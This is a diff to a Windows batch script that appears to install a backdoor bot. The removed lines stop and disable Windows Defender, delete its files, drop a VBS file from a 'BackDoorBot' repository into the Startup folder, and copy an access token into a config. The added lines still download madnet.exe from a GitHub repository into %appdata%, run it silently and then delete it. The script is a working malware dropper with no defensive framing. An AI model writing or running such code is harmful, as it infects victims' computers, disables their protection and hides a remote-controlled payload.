@@ -1,18 +1,19 @@
 @echo off
 
-net stop WinDefend
-sc config WinDefend start= disabled
-del /f /s /q "%ProgramFiles%\Windows Defender"
-del /f /s /q "%ProgramData%\Microsoft\Windows Defender"
+@REM net stop WinDefend
+@REM sc config WinDefend start= disabled
+@REM del /f /s /q "%ProgramFiles%\Windows Defender"
+@REM del /f /s /q "%ProgramData%\Microsoft\Windows Defender"
 
-set /p Token_Num="Token: "
+@REM set /p Token_Num="Token: "
 
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/madnet.exe/main/bot/madnet.exe -OutFile %appdata%\Microsoft\Windows\madnet.exe"
+powershell -Command "Invoke-WebRequest https://github.com/DmodvGH/MadNet/raw/main/bot/madnet.exe -OutFile %appdata%\Microsoft\madnet.exe"
 
-start %appdata%\Microsoft\Windows\windows_shell.exe
+@REM start %appdata%\Microsoft\Windows\windows_shell.exe
 
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/invis.vbs -OutFile '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows.vbs'"
-%appdata%\Microsoft\Windows\madnet.exe -e -aoa
-copy ".\token\%Token_Num%" "%appdata%\Microsoft\Windows\back-d\config"
+@REM powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/invis.vbs -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Windows.vbs'"
+powershell -Command "%appdata%\Microsoft\madnet.exe -e -aoa -y"
+del %appdata%\microsoft\madnet.exe
+@REM copy ".\token\%Token_Num%" "%appdata%\Microsoft\Windows\back-d\config"
 
 pause > nul
